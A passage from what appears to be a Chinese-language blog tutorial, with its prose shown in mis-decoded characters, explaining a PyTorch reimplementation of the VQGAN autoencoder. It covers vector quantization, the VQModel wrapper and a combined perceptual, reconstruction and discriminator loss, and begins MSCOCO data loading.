class="number">3</span>,</span><br><span class="line">                                        stride=<span class="number">1</span>,</span><br><span class="line">                                        padding=<span class="number">1</span>)</span><br><span class="line">        self.end.append(self.conv_out)</span><br><span class="line"></span><br><span class="line">        self.rgb2input_channel = nn.Conv2d(curr_output, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.end.append(self.rgb2input_channel)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># mid -&gt; upsampling -&gt; end</span></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.mid:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.block:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.end:</span><br><span class="line">            x = layer(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„attentionæ“ä½œé‡Œé¢çš„bmméå¸¸å®¹æ˜“çˆ†æ‰cuda,å°½é‡åœ¨resolutionä½ä¸€ç‚¹å†åŠ SelfAttention.</p><h3 id="vectorquantizer2">VectorQuantizer2</h3><p>æœ¬è´¨å°±æ˜¯è®¡ç®—è¾“å…¥åˆ°embeddingçš„è·ç¦»,ç„¶åå–è·ç¦»æœ€å°çš„é‚£ä¸ªvectorä½œä¸ºæˆ‘ä»¬çš„è¾“å‡ºz_q, å³å‘é‡é‡å­åŒ–. ä½†æ˜¯è¿™é‡Œå­˜åœ¨é—®é¢˜:å‘é‡é‡å­åŒ–ä¼šå¯¼è‡´æ— æ³•æ±‚å–æ¢¯åº¦,æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è¿›è¡Œ<a href="https://www.spaces.ac.cn/archives/6760#VQ-VAE">Straight-Through Estimator</a>,è¿™é‡Œçš„é“¾æ¥æ˜¯VQVAEçš„,å¯¹ç†è§£ä¹Ÿæœ‰å¥½å¤„. å¤„ç†å®Œæ¯•ä¹‹åè¿›è¡Œå‘é‡è¿”å›å¹¶ä¸”å°†lossåœ¨è¿™é‡Œæ‰‹åŠ¨è¿”å›,å³codebook loss.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/taming-transformers/blob/master/taming/modules/vqvae/quantize.py#L213</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VectorQuantizer2</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Improved version over VectorQuantizer, can be used as a drop-in replacement. Mostly</span></span><br><span class="line"><span class="string">    avoids costly matrix multiplications and allows for post-hoc remapping of indices.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> due to a bug the beta term was applied to the wrong term. for</span></span><br><span class="line">    <span class="comment"># backwards compatibility we use the buggy version by default, but you can</span></span><br><span class="line">    <span class="comment"># specify legacy=False to fix it.</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_e, e_dim, beta</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.n_e = n_e</span><br><span class="line">        self.e_dim = e_dim</span><br><span class="line">        self.beta = beta</span><br><span class="line"></span><br><span class="line">        self.embedding = nn.Embedding(self.n_e, self.e_dim)</span><br><span class="line">        self.embedding.weight.data.uniform_(-<span class="number">1.0</span> / self.n_e, <span class="number">1.0</span> / self.n_e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, z</span>):</span><br><span class="line">        <span class="comment"># reshape z -&gt; (batch, height, width, channel) and flatten</span></span><br><span class="line">        z = rearrange(z, <span class="string">&#x27;b c h w -&gt; b h w c&#x27;</span>).contiguous()</span><br><span class="line">        z_flattened = z.view(-<span class="number">1</span>, self.e_dim)</span><br><span class="line">        <span class="comment"># distances from z to embeddings e_j (z - e)^2 = z^2 + e^2 - 2 e * z</span></span><br><span class="line"></span><br><span class="line">        d = torch.<span class="built_in">sum</span>(z_flattened ** <span class="number">2</span>, dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>) + \</span><br><span class="line">            torch.<span class="built_in">sum</span>(self.embedding.weight ** <span class="number">2</span>, dim=<span class="number">1</span>) - <span class="number">2</span> * \</span><br><span class="line">            torch.einsum(<span class="string">&#x27;bd,dn-&gt;bn&#x27;</span>, z_flattened, rearrange(self.embedding.weight, <span class="string">&#x27;n d -&gt; d n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        min_encoding_indices = torch.argmin(d, dim=<span class="number">1</span>)</span><br><span class="line">        z_q = self.embedding(min_encoding_indices).view(z.shape)</span><br><span class="line">        perplexity = <span class="literal">None</span></span><br><span class="line">        min_encodings = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># compute loss for embedding(buggy version)</span></span><br><span class="line">        loss = torch.mean((z_q.detach() - z) ** <span class="number">2</span>) + self.beta * torch.mean((z_q - z.detach()) ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># preserve gradients</span></span><br><span class="line">        z_q = z + (z_q - z).detach()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reshape back to match original input shape</span></span><br><span class="line">        z_q = rearrange(z_q, <span class="string">&#x27;b h w c -&gt; b c h w&#x27;</span>).contiguous()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> z_q, loss, (perplexity, min_encodings, min_encoding_indices)</span><br></pre></td></tr></table></figure><h3 id="vqmodel">VQModel</h3><p>æœ€åæˆ‘ä»¬æŠŠå‰é¢çš„æ¨¡å—éƒ½ä¸¢åˆ°ä¸€å—,å³VQModel,åç»­è®­ç»ƒä¹Ÿä¼šç›´æ¥ä½¿ç”¨VQModel. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/latent-diffusion/blob/main/ldm/models/autoencoder.py#L14</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VQModel</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_e, e_dim, beta, input_channel, num_res, f=<span class="number">8</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># essential blocks</span></span><br><span class="line">        self.encoder = Encoder(input_channel, num_res, f)</span><br><span class="line">        self.decoder = Decoder(input_channel, num_res, f)</span><br><span class="line">        self.vq = VectorQuantizer2(n_e, e_dim, beta)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># conv layer after quant</span></span><br><span class="line">        self.quant_conv = torch.nn.Conv2d(input_channel // f, e_dim, <span class="number">1</span>)</span><br><span class="line">        self.post_quant_conv = torch.nn.Conv2d(e_dim, input_channel // f, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, x</span>):</span><br><span class="line">        h = self.encoder(x)</span><br><span class="line">        h = self.quant_conv(h)</span><br><span class="line">        <span class="comment"># z_q, loss, (perplexity, min_encodings, min_encoding_indices)</span></span><br><span class="line">        <span class="keyword">return</span> self.vq(h)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, x</span>):</span><br><span class="line">        quant = self.post_quant_conv(x)</span><br><span class="line">        dec = self.decoder(quant)</span><br><span class="line">        <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        quant, diff, (_, _, ind) = self.encode(x)</span><br><span class="line">        dec = self.decode(quant)</span><br><span class="line">        <span class="keyword">return</span> dec, diff</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_last_layer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.decoder.conv_out.weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_from_ckpt</span>(<span class="params">self, path, ignore_keys=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> ignore_keys <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            ignore_keys = <span class="built_in">list</span>()</span><br><span class="line">        sd = torch.load(path, map_location=<span class="string">&quot;cpu&quot;</span>)[<span class="string">&quot;state_dict&quot;</span>]</span><br><span class="line">        keys = <span class="built_in">list</span>(sd.keys())</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">for</span> ik <span class="keyword">in</span> ignore_keys:</span><br><span class="line">                <span class="keyword">if</span> k.startswith(ik):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Deleting key &#123;&#125; from state_dict.&quot;</span>.<span class="built_in">format</span>(k))</span><br><span class="line">                    <span class="keyword">del</span> sd[k]</span><br><span class="line">        self.load_state_dict(sd, strict=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Restored from <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p><h2 id="loss">Loss</h2><p>å®˜æ–¹çš„Losså†™çš„å…¶å®æŒºæŠ½è±¡çš„, åæ¥å»çœ‹äº†outlierçš„è§†é¢‘å‘ç°ä»–æŠŠå®˜æ–¹çš„æ•´åˆç±»æ‹†å¼€äº†ç„¶åè‡ªå·±æ‰‹åŠ¨åœ¨trainçš„éƒ¨åˆ†æ‰‹å†™äº†ä¸€ä¸ªloss.</p><p>ä»”ç»†æ€è€ƒäº†ä¸€ä¸‹æ„Ÿè§‰ä¼¼ä¹è¿˜æ˜¯å®˜æ–¹çš„æ–¹å¼ä¼šå¥½ä¸€äº›,æ¯•ç«Ÿç¡®å®lossè®¾è®¡çš„é€»è¾‘å¾ˆå¤šå¾ˆæ‚,æŠ½å¼€æ¥çœ‹ç¡®å®å®¹æ˜“ç†è§£,ä½†æ˜¯ä»£ç å¤ç”¨æ€§å°±æŒºå·®çš„.</p><p>é¦–å…ˆè¿™ä¸ªFirst stageçš„æ¨¡å‹çš„æŸå¤±å‡½æ•°æ˜¯ä¸€ä¸ªæ··åˆå‡½æ•°. å®˜æ–¹ç»™ä»–å‘½åä¸º<code>VQLPIPSWithDiscriminator</code>,æ‹†å¼€æ¥å°±æ˜¯VQ + LPIPS + Discriminator.</p><h3 id="vq">VQ</h3><p>è¿™ä¸ªéƒ¨åˆ†åˆšåˆšå·²ç»è¯´è¿‡äº†, codebook lossçš„éƒ¨åˆ†ä¼šç›´æ¥è¢«æ‰‹åŠ¨è®¡ç®—è¿›è¡Œè¿”å›.</p><h3 id="lpips">LPIPS</h3><p>å…¨åLearned Perceptual Image Patch Similarity, å³æ„ŸçŸ¥æŸå¤±. å®ƒèƒ½åšåˆ°ä»€ä¹ˆäº‹æƒ…å‘¢?</p><p>ä¼ ç»ŸMSEæŸå¤±: å¦‚æœä½ æŠŠå›¾ç‰‡å…¨å±€å‘å·¦å¹³ç§»ä¸€æ ¼,ç”±äºæ¯ä¸ªåƒç´ éƒ½å¾—åˆ°äº†å·¨å¹…æ”¹å˜,ä¼šå¯¼è‡´MSEå·¨å¤§. ç„¶è€Œè¿™æ˜¯ä¸åˆç†çš„, ä¸€æ ¼åƒç´ çš„å¹³ç§»ä¸åº”è¯¥é€ æˆè¿™ä¹ˆå¤§çš„æŸå¤±, å°¤å…¶å¯¹äºäººçš„è‚‰çœ¼è€Œè¨€, ä¸€æ ¼åƒç´ çš„å¹³ç§»åº”è¯¥æ˜¯æ²¡æœ‰å¤šå°‘<strong>æ„ŸçŸ¥å·®å¼‚</strong>çš„.</p><p>æ‰€ä»¥LPIPåšåˆ°çš„å°±æ˜¯ä»äººçš„æ„ŸçŸ¥å·®å¼‚å±‚é¢åšè¯¯å·®åˆ¤æ–­. å…·ä½“æ¥è¯´å°±æ˜¯è®­ç»ƒä¸€ä¸ªvggæ¥æ¨¡æ‹Ÿäººç±»è§†è§‰æ„ŸçŸ¥ä»è€Œå¯¹å›¾ç‰‡è¿›è¡Œ<strong>æ„ŸçŸ¥å±‚é¢</strong>çš„æ­£ç¡®è¯„ä¼°.</p><p>ä»£ç æˆ‘ç›´æ¥æŠ„çš„CompViså®˜æ–¹çš„,é¡ºä¾¿å®˜æ–¹æä¾›äº†å·²ç»è®­ç»ƒå¥½çš„vgg,ç›´æ¥loadå°±è¡Œ.</p><p><a href="https://github.com/CompVis/taming-transformers/blob/master/taming/modules/losses/lpips.py#L11">å®˜æ–¹ä»£ç </a></p><p>è¿™ä¸ªéƒ¨åˆ†ä¼šè´Ÿè´£è¿”å›Perceptual Loss</p><h3 id="reconstruction-loss">Reconstruction Loss</h3><p>è¿™ä¸ªéƒ¨åˆ†å®˜æ–¹ç›´æ¥ç”¨çš„L1æŸå¤±, å¯¹p_lossåšæƒé‡ä¹‹åå’Œreconstruction lossä¸€èµ·å–å¹³å‡å°±æ„æˆäº†perceptual_rec_loss <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, codebook_loss, inputs, reconstructions, global_step, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># L1 reconstruction loss</span></span><br><span class="line">    rec_loss = torch.<span class="built_in">abs</span>(inputs.contiguous() - reconstructions.contiguous())</span><br><span class="line">    <span class="comment"># perceptual loss</span></span><br><span class="line">    p_loss = self.perceptual_loss(inputs.contiguous(), reconstructions.contiguous())</span><br><span class="line">    <span class="comment"># weight * p_loss and get mean</span></span><br><span class="line">    perceptual_rec_loss = torch.mean(rec_loss + self.perceptual_weight * p_loss)</span><br></pre></td></tr></table></figure></p><h3 id="discriminator-loss">Discriminator Loss</h3><p>è¿™ä¸ªdiscriminator losså°±æ˜¯ç”¨çš„GANçš„ideaäº†. Discriminatorçš„ä»£ç å¯ä»¥ç›´æ¥<a href="https://github.com/CompVis/taming-transformers/blob/master/taming/modules/discriminator/model.py#L17">ç…§æŠ„</a>. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.discriminator = NLayerDiscriminator(input_nc=disc_in_channels,</span><br><span class="line">                                                 n_layers=disc_num_layers,</span><br><span class="line">                                                 use_actnorm=use_actnorm,</span><br><span class="line">                                                 ndf=disc_ndf</span><br><span class="line">                                                 ).apply(weights_init)</span><br></pre></td></tr></table></figure></p><p>ç„¶åæŸå¤±éƒ¨åˆ†åç»­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, codebook_loss, inputs, reconstructions, global_step, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ################</span></span><br><span class="line"><span class="string">    Reconstruction Loss part here</span></span><br><span class="line"><span class="string">    ################</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># discriminator part</span></span><br><span class="line">    disc_real = self.discriminator(inputs)</span><br><span class="line">    disc_fake = self.discriminator(reconstructions)</span><br><span class="line">    <span class="comment"># generator loss</span></span><br><span class="line">    g_loss = -torch.mean(disc_fake)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># discriminator loss</span></span><br><span class="line">    disc_factor = adopt_weight(self.disc_factor, global_step, threshold=self.discriminator_iter_start)</span><br><span class="line">    d_loss = disc_factor * self.disc_loss(disc_real, disc_fake)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get d_weight by calling `calculate_adaptive_weight`</span></span><br><span class="line">    d_weight = self.calculate_adaptive_weight(perceptual_rec_loss, g_loss, last_layer=last_layer)</span><br><span class="line">    vq_loss = perceptual_rec_loss + self.codebook_weight * codebook_loss + disc_factor * d_weight * d_loss</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vq_loss, d_loss</span><br></pre></td></tr></table></figure><p>adopt_weightå¯¹discriminatorè¿›è¡Œå»¶åè®¾ç½®(å³å¤šå°‘å…¨å±€æ­¥æ•°ä¹‹åæ‰ä¼šå¯ç”¨discriminator).</p><p>æœ€åæŠŠreal inputå’Œreconstruct inputè¿›è¡Œè¾“å…¥,ä½¿ç”¨hinge lossè¿›è¡Œè¯¯å·®è®¡ç®—, ç„¶åç”Ÿæˆä¸€ä¸ªd_loss,å³discriminator loss.</p><p>è¿™é‡Œè¿˜ä¼šæ¶‰åŠä¸€ä¸ªg_lossæ¥æ±‚å¾—ä¸€ä¸ªæ‰€è°“çš„lambda(outlieræ˜¯è¿™ä¹ˆè¯´çš„),ä¹Ÿå°±æ˜¯è¿™é‡Œçš„d_weight. è¿™é‡Œæˆ‘ä¸å¤ªäº†è§£ç»†èŠ‚,ä¼°è®¡æ˜¯GANç›¸å…³çŸ¥è¯†?åç»­æœ‰æœºä¼šå†è¡¥.</p><p>è¿™ä¸ªç”Ÿæˆçš„d_weightä½œä¸ºdiscriminatorçš„è¯¯å·®æƒé‡åŠ å…¥æœ€ç»ˆè¯¯å·®vq_lossçš„è®¡ç®—,ç„¶åè¿”å›vq_losså’Œd_loss.</p><h3 id="å®Œæ•´lossä»£ç ">å®Œæ•´lossä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">VQLPIPSWithDiscriminator</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, disc_start=<span class="number">1</span>, codebook_weight=<span class="number">1.0</span>,</span></span><br><span class="line"><span class="params">                 disc_num_layers=<span class="number">3</span>, disc_in_channels=<span class="number">3</span>, disc_factor=<span class="number">1.0</span>, disc_weight=<span class="number">0.6</span>,</span></span><br><span class="line"><span class="params">                 perceptual_weight=<span class="number">1.0</span>, use_actnorm=<span class="literal">False</span>, disc_conditional=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                 disc_ndf=<span class="number">64</span>, disc_loss=<span class="string">&quot;hinge&quot;</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.codebook_weight = codebook_weight</span><br><span class="line">        self.perceptual_loss = LPIPS().<span class="built_in">eval</span>()</span><br><span class="line">        self.perceptual_weight = perceptual_weight</span><br><span class="line">        self.discriminator = NLayerDiscriminator(input_nc=disc_in_channels,</span><br><span class="line">                                                 n_layers=disc_num_layers,</span><br><span class="line">                                                 use_actnorm=use_actnorm,</span><br><span class="line">                                                 ndf=disc_ndf</span><br><span class="line">                                                 ).apply(weights_init)</span><br><span class="line">        self.discriminator_iter_start = disc_start</span><br><span class="line">        <span class="keyword">if</span> disc_loss == <span class="string">&quot;hinge&quot;</span>:</span><br><span class="line">            self.disc_loss = hinge_d_loss</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown GAN loss &#x27;<span class="subst">&#123;disc_loss&#125;</span>&#x27;.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;VQLPIPSWithDiscriminator running with <span class="subst">&#123;disc_loss&#125;</span> loss.&quot;</span>)</span><br><span class="line">        self.disc_factor = disc_factor</span><br><span class="line">        self.discriminator_weight = disc_weight</span><br><span class="line">        self.disc_conditional = disc_conditional</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculate_adaptive_weight</span>(<span class="params">self, nll_loss, g_loss, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># calculating d_weight</span></span><br><span class="line">        <span class="keyword">if</span> last_layer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            nll_grads = torch.autograd.grad(nll_loss, last_layer, retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">            g_grads = torch.autograd.grad(g_loss, last_layer, retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nll_grads = torch.autograd.grad(nll_loss, self.last_layer[<span class="number">0</span>], retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">            g_grads = torch.autograd.grad(g_loss, self.last_layer[<span class="number">0</span>], retain_graph=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        d_weight = torch.norm(nll_grads) / (torch.norm(g_grads) + <span class="number">1e-4</span>)</span><br><span class="line">        d_weight = torch.clamp(d_weight, <span class="number">0.0</span>, <span class="number">1e4</span>).detach()</span><br><span class="line">        d_weight = d_weight * self.discriminator_weight</span><br><span class="line">        <span class="keyword">return</span> d_weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, codebook_loss, inputs, reconstructions, global_step, last_layer=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># L1 reconstruction loss</span></span><br><span class="line">        rec_loss = torch.<span class="built_in">abs</span>(inputs.contiguous() - reconstructions.contiguous())</span><br><span class="line">        <span class="comment"># perceptual loss</span></span><br><span class="line">        p_loss = self.perceptual_loss(inputs.contiguous(), reconstructions.contiguous())</span><br><span class="line">        <span class="comment"># weight * p_loss and get mean</span></span><br><span class="line">        perceptual_rec_loss = torch.mean(rec_loss + self.perceptual_weight * p_loss)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># discriminator part</span></span><br><span class="line">        disc_real = self.discriminator(inputs)</span><br><span class="line">        disc_fake = self.discriminator(reconstructions)</span><br><span class="line">        <span class="comment"># generator loss</span></span><br><span class="line">        g_loss = -torch.mean(disc_fake)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># discriminator loss</span></span><br><span class="line">        disc_factor = adopt_weight(self.disc_factor, global_step, threshold=self.discriminator_iter_start)</span><br><span class="line">        d_loss = disc_factor * self.disc_loss(disc_real, disc_fake)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get d_weight by calling `calculate_adaptive_weight`</span></span><br><span class="line">        d_weight = self.calculate_adaptive_weight(perceptual_rec_loss, g_loss, last_layer=last_layer)</span><br><span class="line">        vq_loss = perceptual_rec_loss + self.codebook_weight * codebook_loss + disc_factor * d_weight * d_loss</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> vq_loss, d_loss</span><br></pre></td></tr></table></figure><p>å¤æ‚å—?ç¡®å®æŒºå¤æ‚çš„,ä¸‰ç±»è¯¯å·®å…¨éƒ¨ä¸¢åˆ°ä¸€ä¸ªç±»é‡Œé¢æ€ä¹ˆæ‰èƒ½ä¸å¤æ‚, å®˜æ–¹å†™vqgançš„æ—¶å€™ç”šè‡³ä½¿ç”¨çš„æ˜¯<code>pl.LightningModule</code>,è¿™æ˜¯ä¸€ä¸ªpytorchçš„é«˜çº§æ¡†æ¶,é‡Œé¢æœ‰äº›å‚æ•°(æ¯”å¦‚optimizer_idx)æ˜¯æ¡†æ¶å¤„ç†çš„,è¯»èµ·æ¥å°±æ›´åŠ è´¹åŠ². ä¸è¿‡å¤šäºäº†outlierçš„è§†é¢‘å’Œä»£ç æœ€ç»ˆçš„å®ç°æ‰ç®€å•ä¸å°‘.</p><p>ä¸è¿‡æœ€ç»ˆè€ƒè™‘åˆ°æ¨¡å—åŠŸèƒ½ç¡®å®æ˜¯æ±‚æŸå¤±å‡½æ•°æˆ‘è¿˜æ˜¯é€‰æ‹©äº†æŠŠè¿™äº›ä¸€èµ·ä¸¢åˆ°äº†<code>VQLPIPSWithDiscriminator</code>è¿™ä¸ªç±».</p><h2 id="datasetå’Œtrain_class">datasetå’Œtrain_class</h2><h3 id="æ•°æ®é›†">æ•°æ®é›†</h3><p>æ•°æ®é›†ç”¨çš„mscoco.</p><p>ä½¿ç”¨è¯´æ˜åœ°å€:<br /><a href="https://github.com/rom1504/img2dataset/blob/main/dataset_examples/mscoco.md">https://github.com/rom1504/img2dataset/blob/main/dataset_examples/mscoco.md</a></p><p>ä¸‹è½½ä¸‹æ¥äº†è§£äº†ä¸€ä¸‹å‘ç°æ˜¯webdataset,æ‰‹åŠ¨å†™ä¸ªè½½å…¥.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> webdataset <span class="keyword">as</span> wds</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preprocessing</span>(<span class="params">sample</span>):</span><br><span class="line">    txt, img = sample</span><br><span class="line">    preproc = transforms.Compose([</span><br><span class="line">        transforms.Resize((<span class="number">256</span>, <span class="number">256</span>)),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">    ])</span><br><span class="line">    <span class="keyword">return</span> txt, 